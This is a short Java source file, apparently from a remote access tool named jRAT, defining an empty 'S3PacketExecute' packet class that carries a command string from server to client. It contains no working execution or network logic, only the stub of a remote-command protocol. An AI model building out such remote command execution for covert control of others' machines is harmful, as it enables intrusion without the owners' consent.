package net.jrat.core.packet.server;

import net.jrat.core.packet.IPacket;

@SuppressWarnings("unused")
public class S3PacketExecute implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String command;
	
	public S3PacketExecute(String command)
	{
		this.command = command;
	}
	
	@Override
	public void execute(Object object) throws Exception {}
}